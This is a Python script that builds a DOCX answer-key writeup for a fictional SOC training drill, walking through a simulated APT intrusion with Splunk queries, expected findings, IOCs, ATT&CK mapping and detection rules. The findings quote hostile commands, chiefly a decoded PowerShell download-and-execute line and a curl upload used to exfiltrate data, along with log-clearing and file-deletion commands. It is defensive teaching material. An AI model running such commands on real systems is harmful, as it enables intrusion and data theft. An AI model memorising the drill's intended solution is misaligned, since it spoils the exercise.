#!/usr/bin/env python3
"""Generate SOC Cyber Drill Writeup as DOCX"""
from docx import Document
from docx.shared import Inches, Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.style import WD_STYLE_TYPE

doc = Document()

# Styles
style = doc.styles['Normal']
style.font.name = 'Calibri'
style.font.size = Pt(11)
style.paragraph_format.space_after = Pt(6)

for level in range(1, 4):
    hs = doc.styles[f'Heading {level}']
    hs.font.color.rgb = RGBColor(0x1D, 0x9E, 0x75)

# ─── TITLE PAGE ─────────────────────────────────────────
doc.add_paragraph()
doc.add_paragraph()
t = doc.add_paragraph()
t.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = t.add_run('SOC Cyber Drill Exercise')
r.font.size = Pt(28)
r.font.color.rgb = RGBColor(0x1D, 0x9E, 0x75)
r.bold = True

t2 = doc.add_paragraph()
t2.alignment = WD_ALIGN_PARAGRAPH.CENTER
r2 = t2.add_run('Intended Solution Writeup')
r2.font.size = Pt(18)
r2.font.color.rgb = RGBColor(0x47, 0x55, 0x69)

doc.add_paragraph()
t3 = doc.add_paragraph()
t3.alignment = WD_ALIGN_PARAGRAPH.CENTER
t3.add_run('PT Nusantara Digital — APT Attack Investigation\n').font.size = Pt(12)
t3.add_run('JagoanSiber · SOC Analyst Training\n').font.size = Pt(12)
t3.add_run('April 2026 | Confidential').font.size = Pt(10)

doc.add_page_break()

# ─── TABLE OF CONTENTS (manual) ─────────────────────────
doc.add_heading('Table of Contents', level=1)
toc = [
    "1. Scenario Overview",
    "2. Environment & Assets",
    "3. Investigation Walkthrough",
    "   Step 1: Initial Triage — Reconnaissance Detection",
    "   Step 2: Identify Phishing Execution",
    "   Step 3: Trace C2 Communication",
    "   Step 4: Track Lateral Movement",
    "   Step 5: Find Persistence Mechanisms",
    "   Step 6: Identify Data Exfiltration",
    "   Step 7: Detect Defense Evasion",
    "4. IOC Summary",
    "5. MITRE ATT&CK Mapping",
    "6. Incident Report Template (Filled)",
    "7. Recommended Detection Rules",
]
for item in toc:
    p = doc.add_paragraph(item)
    p.paragraph_format.space_after = Pt(2)

doc.add_page_break()

# ─── 1. SCENARIO ────────────────────────────────────────
doc.add_heading('1. Scenario Overview', level=1)
doc.add_paragraph(
    'PT Nusantara Digital, sebuah perusahaan teknologi di Jakarta, mengalami insiden keamanan siber. '
    'Tim SOC mendeteksi beberapa anomali di SIEM (Splunk) yang mengindikasikan adanya serangan APT (Advanced Persistent Threat).'
)
doc.add_paragraph(
    'Tugas kamu sebagai SOC analyst adalah menginvestigasi insiden ini menggunakan log yang tersedia di Splunk. '
    'Identifikasi: apa yang terjadi, bagaimana attacker masuk, apa yang mereka lakukan, dan apa dampaknya.'
)

doc.add_heading('Timeline', level=2)
doc.add_paragraph('Logs mencakup 3 hari: 7-9 April 2026')
timeline = [
    ('Day 1 (7 Apr)', 'Normal operations + Reconnaissance + Initial Compromise + C2 Established'),
    ('Day 2 (8 Apr)', 'Discovery + Credential Theft + Lateral Movement + Persistence + Data Collection'),
    ('Day 3 (9 Apr)', 'Data Exfiltration + Cleanup/Defense Evasion'),
]
for day, desc in timeline:
    p = doc.add_paragraph()
    p.add_run(f'{day}: ').bold = True
    p.add_run(desc)

doc.add_heading('Available Log Sources', level=2)
sources = [
    ('index=firewall', 'pan_traffic', '~18,000 events', 'Palo Alto firewall traffic logs'),
    ('index=dns', 'pan_dns', '~8,000 events', 'DNS query logs'),
    ('index=ids', 'suricata', '~4,500 events', 'Suricata IDS alerts + flow'),
    ('index=windows', 'WinEventLog', '~4,300 events', 'Windows Security Event Log'),
    ('index=sysmon', 'XmlWinEventLog', '~5,900 events', 'Sysmon process/network/file events'),
    ('index=linux', 'linux_audit, syslog', '~1,900 events', 'Linux auditd + syslog'),
    ('index=web', 'access_combined', '~1,800 events', 'Apache web server access logs'),
]
table = doc.add_table(rows=1, cols=4)
table.style = 'Light Grid Accent 1'
hdr = table.rows[0].cells
hdr[0].text = 'Index'
hdr[1].text = 'Sourcetype'
hdr[2].text = 'Volume'
hdr[3].text = 'Description'
for idx, st, vol, desc in sources:
    row = table.add_row().cells
    row[0].text = idx
    row[1].text = st
    row[2].text = vol
    row[3].text = desc

doc.add_page_break()

# ─── 2. ENVIRONMENT ─────────────────────────────────────
doc.add_heading('2. Environment & Assets', level=1)
assets = [
    ('FW-EDGE-01', '203.0.113.1 / 10.10.0.1', 'Edge Firewall'),
    ('WEB-SERVER-01', '10.10.1.10', 'Ubuntu web server (DMZ)'),
    ('WS-FINANCE-01', '10.10.2.50', 'Windows 11 — Finance dept'),
    ('WS-HR-02', '10.10.2.51', 'Windows 11 — HR dept'),
    ('DC-01', '10.10.3.10', 'Windows Server 2022 — Domain Controller'),
    ('DB-SERVER-01', '10.10.3.20', 'Ubuntu — MySQL database'),
]
table2 = doc.add_table(rows=1, cols=3)
table2.style = 'Light Grid Accent 1'
h = table2.rows[0].cells
h[0].text = 'Hostname'; h[1].text = 'IP'; h[2].text = 'Role'
for name, ip, role in assets:
    r = table2.add_row().cells
    r[0].text = name; r[1].text = ip; r[2].text = role

doc.add_page_break()

# ─── 3. INVESTIGATION ───────────────────────────────────
doc.add_heading('3. Investigation Walkthrough', level=1)

# STEP 1
doc.add_heading('Step 1: Initial Triage — Reconnaissance Detection', level=2)
doc.add_paragraph(
    'Mulai investigasi dengan mencari anomali awal. Cek Suricata IDS alerts untuk scan activity.'
)
doc.add_heading('Splunk Query:', level=3)
doc.add_paragraph('index=ids sourcetype=suricata alert.signature="ET SCAN*" | stats count by src_ip alert.signature', style='No Spacing')
doc.add_heading('Expected Findings:', level=3)
doc.add_paragraph('• Source IP: 91.215.85.142 (Romania)')
doc.add_paragraph('• 18 port scan alerts targeting WEB-SERVER-01 (10.10.1.10)')
doc.add_paragraph('• Ports scanned: 21, 22, 23, 25, 80, 110, 135, 139, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 8080, 8443')
doc.add_paragraph('• Timestamp: Apr 7 ~09:15 WIB')

doc.add_heading('Corroborating Evidence (Firewall):', level=3)
doc.add_paragraph('index=firewall 91.215.85.142 | stats count by dest_port action', style='No Spacing')
doc.add_paragraph('• All connections DENIED by firewall — scanner was blocked at perimeter')

doc.add_heading('Web Scan Evidence:', level=3)
doc.add_paragraph('index=ids sourcetype=suricata "SQL Injection" OR "Cross-Site" | table timestamp src_ip alert.signature', style='No Spacing')
doc.add_paragraph('• SQLi and XSS attempts from same IP targeting web server')
doc.add_paragraph('index=web 91.215.85.142 | table _time clientip uri_path status', style='No Spacing')
doc.add_paragraph('• Apache logs show 404/400 responses to scanner probes')

p = doc.add_paragraph()
p.add_run('MITRE ATT&CK: ').bold = True
p.add_run('T1595 — Active Scanning')

# STEP 2
doc.add_heading('Step 2: Identify Phishing Execution', level=2)
doc.add_paragraph(
    'Scanner was blocked, tapi attacker punya rencana lain. Cari tanda-tanda phishing execution di endpoint.'
)
doc.add_heading('Splunk Query:', level=3)
doc.add_paragraph('index=sysmon EventID=1 ParentImage="*WINWORD*" | table _time Computer Image CommandLine ParentImage User', style='No Spacing')
doc.add_heading('Expected Findings:', level=3)
doc.add_paragraph('• Host: WS-FINANCE-01')
doc.add_paragraph('• User: NUSANTARA\\ratna.finance')
doc.add_paragraph('• WINWORD.EXE → cmd.exe → powershell.exe -nop -w hidden -enc [Base64]')
doc.add_paragraph('• File opened: Invoice_Q1_2026.docm')
doc.add_paragraph('• Timestamp: Apr 7, 14:47 WIB')

doc.add_heading('Decode Base64:', level=3)
doc.add_paragraph('Base64 decodes to: IEX (New-Object Net.WebClient).DownloadString(\'https://dl.techsupport-cdn.net/update.exe\')')
doc.add_paragraph('• Downloads malicious payload from attacker staging server')

doc.add_heading('File Drop Evidence:', level=3)
doc.add_paragraph('index=sysmon EventID=11 TargetFilename="*svchost_update*" | table _time Computer TargetFilename Hashes', style='No Spacing')
doc.add_paragraph('• Payload dropped: C:\\Users\\ratna.finance\\AppData\\Local\\Temp\\svchost_update.exe')
doc.add_paragraph(f'• SHA256: a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890')

p = doc.add_paragraph()
p.add_run('MITRE ATT&CK: ').bold = True
p.add_run('T1566.001 (Phishing Attachment), T1059.001 (PowerShell), T1204.002 (User Execution)')

# STEP 3
doc.add_heading('Step 3: Trace C2 Communication', level=2)
doc.add_paragraph('Setelah payload dieksekusi, attacker establish C2 channel.')
doc.add_heading('Splunk Query:', level=3)
doc.add_paragraph('index=sysmon EventID=3 DestinationIp=45.77.65.211 | table _time Computer Image DestinationIp DestinationPort', style='No Spacing')
doc.add_heading('Expected Findings:', level=3)
doc.add_paragraph('• svchost_update.exe connecting to 45.77.65.211:443')
doc.add_paragraph('• C2 server GeoIP: Netherlands')

doc.add_heading('Beacon Pattern Analysis:', level=3)
doc.add_paragraph('index=firewall dest_ip=45.77.65.211 | timechart count span=5m', style='No Spacing')
doc.add_paragraph('• Regular interval connections every ~60 seconds — classic beacon pattern')
doc.add_paragraph('• ~3,071 beacon events over 3 days')

doc.add_heading('DNS Resolution:', level=3)
doc.add_paragraph('index=dns update-service.cloud | table _time src_ip domain answer', style='No Spacing')
doc.add_paragraph('• C2 domain: update-service.cloud → resolves to 45.77.65.211')

p = doc.add_paragraph()
p.add_run('MITRE ATT&CK: ').bold = True
p.add_run('T1071.001 (Web Protocols C2)')

# STEP 4
doc.add_heading('Step 4: Track Lateral Movement', level=2)
doc.add_paragraph('Attacker menggunakan credentials yang dicuri untuk bergerak lateral.')

doc.add_heading('Credential Dumping (Mimikatz):', level=3)
doc.add_paragraph('index=sysmon EventID=10 TargetImage="*lsass*" | table _time Computer SourceImage TargetImage GrantedAccess', style='No Spacing')
doc.add_paragraph('• PowerShell accessing LSASS process — Mimikatz pattern')
doc.add_paragraph('• Timestamp: Apr 8, 09:15 WIB')

doc.add_heading('Pass-the-Hash to Domain Controller:', level=3)
doc.add_paragraph('index=windows EventCode=4624 LogonType=3 src_ip=10.10.2.50 host=DC-01* | table _time src_ip Account_Name LogonType Authentication_Package', style='No Spacing')
doc.add_paragraph('• NTLM authentication from WS-FINANCE-01 (10.10.2.50) to DC-01')
doc.add_paragraph('• Account: ratna.finance with ADMIN privileges (EventCode 4672)')
doc.add_paragraph('• Timestamp: Apr 8, 09:20 WIB')

doc.add_heading('SSH to Database Server:', level=3)
doc.add_paragraph('index=linux sourcetype=syslog "Accepted" 10.10.2.50 | table _time host src_ip', style='No Spacing')
doc.add_paragraph('• SSH login to DB-SERVER-01 from 10.10.2.50 (compromised workstation)')
doc.add_paragraph('• Login as root — password authentication (not key)')

p = doc.add_paragraph()
p.add_run('MITRE ATT&CK: ').bold = True
p.add_run('T1003.001 (LSASS Dump), T1550.002 (Pass the Hash), T1021.004 (SSH)')

# STEP 5
doc.add_heading('Step 5: Find Persistence Mechanisms', level=2)

doc.add_heading('Backdoor Account Created:', level=3)
doc.add_paragraph('index=windows EventCode=4720 | table _time host Account_Name Target_Account_Name', style='No Spacing')
doc.add_paragraph('• New user created on DC-01: svc_backup')
doc.add_paragraph('• Created by: ratna.finance (compromised account)')

doc.add_heading('Added to Domain Admins:', level=3)
doc.add_paragraph('index=windows EventCode=4728 Group_Name="Domain Admins" | table _time host Account_Name Member_Name Group_Name', style='No Spacing')
doc.add_paragraph('• svc_backup added to Domain Admins group')
doc.add_paragraph('• Timestamp: Apr 8, 09:22 WIB')

doc.add_heading('Scheduled Task:', level=3)
doc.add_paragraph('index=windows EventCode=4698 | table _time host Task_Name', style='No Spacing')
doc.add_paragraph('• Task: \\Microsoft\\Windows\\Maintenance\\SystemUpdate')
doc.add_paragraph('• Runs svchost_update.exe daily at 09:00 as SYSTEM')

doc.add_heading('Schtasks Command:', level=3)
doc.add_paragraph('index=sysmon EventID=1 Image="*schtasks*" | table _time Computer CommandLine', style='No Spacing')

p = doc.add_paragraph()
p.add_run('MITRE ATT&CK: ').bold = True
p.add_run('T1136.002 (Create Account), T1078.002 (Domain Accounts), T1053.005 (Scheduled Task)')

# STEP 6
doc.add_heading('Step 6: Identify Data Exfiltration', level=2)

doc.add_heading('Database Dump:', level=3)
doc.add_paragraph('index=linux sourcetype=linux_audit comm="mysqldump" | table _time host comm exe', style='No Spacing')
doc.add_paragraph('• mysqldump --all-databases executed on DB-SERVER-01')
doc.add_paragraph('• Timestamp: Apr 8, 14:00 WIB')

doc.add_heading('Data Compressed:', level=3)
doc.add_paragraph('index=linux sourcetype=linux_audit comm="tar" | table _time host', style='No Spacing')
doc.add_paragraph('• tar czf /tmp/bak.tar.gz — compressed database dump')

doc.add_heading('Data Exfiltrated:', level=3)
doc.add_paragraph('index=linux sourcetype=linux_audit comm="curl" 185.234.216.88 | table _time host', style='No Spacing')
doc.add_paragraph('• curl POST upload to 185.234.216.88 (attacker staging)')
doc.add_paragraph('• Timestamp: Apr 9, 02:30 WIB (after hours)')

doc.add_heading('Firewall Evidence:', level=3)
doc.add_paragraph('index=firewall dest_ip=185.234.216.88 | table _time src_ip dest_ip bytes_sent bytes_received', style='No Spacing')
doc.add_paragraph('• Large outbound transfer: ~250 MB from DB-SERVER-01 to 185.234.216.88')

p = doc.add_paragraph()
p.add_run('MITRE ATT&CK: ').bold = True
p.add_run('T1005 (Data from Local System), T1041 (Exfiltration Over C2 Channel)')

# STEP 7
doc.add_heading('Step 7: Detect Defense Evasion', level=2)

doc.add_heading('Event Log Cleared:', level=3)
doc.add_paragraph('index=windows EventCode=1102 | table _time host Account_Name', style='No Spacing')
doc.add_paragraph('• Security log cleared on WS-FINANCE-01')
doc.add_paragraph('• By: ratna.finance')
doc.add_paragraph('• Timestamp: Apr 9, 02:40 WIB')

doc.add_heading('Wevtutil Used:', level=3)
doc.add_paragraph('index=sysmon EventID=1 Image="*wevtutil*" | table _time Computer CommandLine', style='No Spacing')
doc.add_paragraph('• wevtutil cl Security — cleared security event log')

doc.add_heading('File Cleanup:', level=3)
doc.add_paragraph('index=linux sourcetype=linux_audit comm="rm" | table _time host', style='No Spacing')
doc.add_paragraph('• rm -f /tmp/bak.tar.gz — removed staged data')

p = doc.add_paragraph()
p.add_run('MITRE ATT&CK: ').bold = True
p.add_run('T1070.001 (Clear Windows Event Logs), T1070.004 (File Deletion)')

doc.add_page_break()

# ─── 4. IOC SUMMARY ─────────────────────────────────────
doc.add_heading('4. IOC Summary', level=1)
iocs = [
    ('IP Address', '91.215.85.142', 'Initial recon scanner (Romania)'),
    ('IP Address', '185.234.216.88', 'Payload staging + exfil destination (Russia)'),
    ('IP Address', '45.77.65.211', 'C2 server (Netherlands)'),
    ('Domain', 'update-service.cloud', 'C2 domain'),
    ('Domain', 'dl.techsupport-cdn.net', 'Payload download domain'),
    ('SHA256', 'a1b2c3d4e5f67890abcdef...', 'Malicious payload'),
    ('File Path', 'C:\\Users\\ratna.finance\\AppData\\Local\\Temp\\svchost_update.exe', 'Dropped payload'),
    ('File Path', '/tmp/bak.tar.gz', 'Staged exfil data'),
    ('User Account', 'svc_backup', 'Backdoor domain admin account'),
    ('Scheduled Task', '\\Microsoft\\Windows\\Maintenance\\SystemUpdate', 'Persistence'),
    ('User-Agent', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)', 'C2 beacon UA (outdated)'),
]
ioc_table = doc.add_table(rows=1, cols=3)
ioc_table.style = 'Light Grid Accent 1'
h = ioc_table.rows[0].cells
h[0].text = 'Type'; h[1].text = 'Value'; h[2].text = 'Context'
for t, v, c in iocs:
    r = ioc_table.add_row().cells
    r[0].text = t; r[1].text = v; r[2].text = c

doc.add_page_break()

# ─── 5. MITRE ATT&CK ────────────────────────────────────
doc.add_heading('5. MITRE ATT&CK Mapping', level=1)
mitre = [
    ('Reconnaissance', 'T1595', 'Active Scanning', 'Suricata scan alerts'),
    ('Initial Access', 'T1566.001', 'Phishing Attachment', 'WINWORD→cmd→powershell'),
    ('Execution', 'T1059.001', 'PowerShell', 'Encoded PowerShell downloader'),
    ('Persistence', 'T1053.005', 'Scheduled Task', 'SystemUpdate task'),
    ('Persistence', 'T1136.002', 'Create Account', 'svc_backup account'),
    ('Privilege Escalation', 'T1078.002', 'Domain Accounts', 'Added to Domain Admins'),
    ('Defense Evasion', 'T1070.001', 'Clear Event Logs', 'wevtutil cl Security'),
    ('Defense Evasion', 'T1027', 'Obfuscated Files', 'Base64 encoded PowerShell'),
    ('Credential Access', 'T1003.001', 'LSASS Memory', 'Sysmon Event 10 on lsass'),
    ('Discovery', 'T1082', 'System Info', 'systeminfo, ipconfig, net group'),
    ('Lateral Movement', 'T1550.002', 'Pass the Hash', 'NTLM auth to DC-01'),
    ('Lateral Movement', 'T1021.004', 'SSH', 'SSH from workstation to DB'),
    ('Collection', 'T1005', 'Local Data', 'mysqldump all databases'),
    ('Exfiltration', 'T1041', 'Over C2 Channel', 'curl upload to staging'),
    ('C2', 'T1071.001', 'Web Protocols', 'HTTPS beacon to 45.77.65.211'),
]
m_table = doc.add_table(rows=1, cols=4)
m_table.style = 'Light Grid Accent 1'
h = m_table.rows[0].cells
h[0].text = 'Tactic'; h[1].text = 'ID'; h[2].text = 'Technique'; h[3].text = 'Evidence'
for tactic, tid, tech, ev in mitre:
    r = m_table.add_row().cells
    r[0].text = tactic; r[1].text = tid; r[2].text = tech; r[3].text = ev

doc.add_page_break()

# ─── 6. INCIDENT REPORT ─────────────────────────────────
doc.add_heading('6. Incident Report (Filled Example)', level=1)

doc.add_heading('Executive Summary', level=2)
doc.add_paragraph(
    'Pada 7-9 April 2026, PT Nusantara Digital mengalami serangan APT yang berhasil mengkompromikan '
    'workstation finance department (WS-FINANCE-01), domain controller (DC-01), dan database server (DB-SERVER-01). '
    'Attacker masuk melalui phishing email dengan malicious macro, establish C2 channel, mencuri credentials, '
    'melakukan lateral movement, dan mengekstrak database perusahaan (~250 MB). '
    'Backdoor account "svc_backup" dengan Domain Admin privileges telah dibuat untuk persistence.'
)

doc.add_heading('Impact Assessment', level=2)
doc.add_paragraph('• Data: Full MySQL database dump exfiltrated (customer data, financial records)')
doc.add_paragraph('• Systems: 3 systems compromised (WS-FINANCE-01, DC-01, DB-SERVER-01)')
doc.add_paragraph('• Accounts: 1 account compromised (ratna.finance), 1 backdoor created (svc_backup)')
doc.add_paragraph('• Duration: ~43 hours from initial access to exfiltration')
doc.add_paragraph('• Severity: CRITICAL')

doc.add_heading('Recommended Immediate Actions', level=2)
doc.add_paragraph('1. Disable account "svc_backup" and reset password for "ratna.finance"')
doc.add_paragraph('2. Isolate WS-FINANCE-01, DB-SERVER-01 from network')
doc.add_paragraph('3. Block IPs: 45.77.65.211, 185.234.216.88, 91.215.85.142 at firewall')
doc.add_paragraph('4. Block domains: update-service.cloud, dl.techsupport-cdn.net')
doc.add_paragraph('5. Remove scheduled task "SystemUpdate" from WS-FINANCE-01')
doc.add_paragraph('6. Remove malware: C:\\Users\\ratna.finance\\AppData\\Local\\Temp\\svchost_update.exe')
doc.add_paragraph('7. Force password reset for all Domain Admin accounts')
doc.add_paragraph('8. Scan all endpoints for IOCs listed above')
doc.add_paragraph('9. Notify legal/compliance team — potential data breach')

doc.add_page_break()

# ─── 7. DETECTION RULES ─────────────────────────────────
doc.add_heading('7. Recommended Detection Rules', level=1)
doc.add_paragraph('Berdasarkan investigasi ini, berikut detection rules yang harus ditambahkan:')

rules = [
    ('Encoded PowerShell Execution', 
     'index=sysmon EventID=1 Image="*powershell*" (CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*")',
     'Detect obfuscated PowerShell — common malware technique'),
    ('LSASS Access (Credential Dumping)',
     'index=sysmon EventID=10 TargetImage="*lsass.exe" GrantedAccess=0x1010',
     'Detect Mimikatz-style credential dumping'),
    ('New Domain Admin Account',
     'index=windows EventCode=4728 Group_Name="Domain Admins"',
     'Alert on any addition to Domain Admins group'),
    ('Event Log Cleared',
     'index=windows EventCode=1102',
     'Always investigate — almost always malicious'),
    ('Large Outbound Transfer',
     'index=firewall action=allow | stats sum(bytes_sent) as total by src_ip dest_ip | where total > 100000000',
     'Detect potential data exfiltration (>100MB)'),
    ('C2 Beacon Pattern',
     'index=firewall dest_ip=* | bucket _time span=5m | stats count by _time dest_ip | where count > 50',
     'Detect regular interval connections (beaconing)'),
    ('Scheduled Task via Schtasks',
     'index=sysmon EventID=1 Image="*schtasks.exe" CommandLine="*/create*"',
     'Monitor all new scheduled task creation'),
]

for name, query, desc in rules:
    doc.add_heading(name, level=3)
    doc.add_paragraph(f'Query: {query}', style='No Spacing')
    doc.add_paragraph(f'Purpose: {desc}')

# ─── SAVE ────────────────────────────────────────────────
output = "/mnt/d/cheatsheet-blue-team/dataset/SOC_Cyber_Drill_Writeup.docx"
doc.save(output)
print(f"✅ Writeup saved to: {output}")
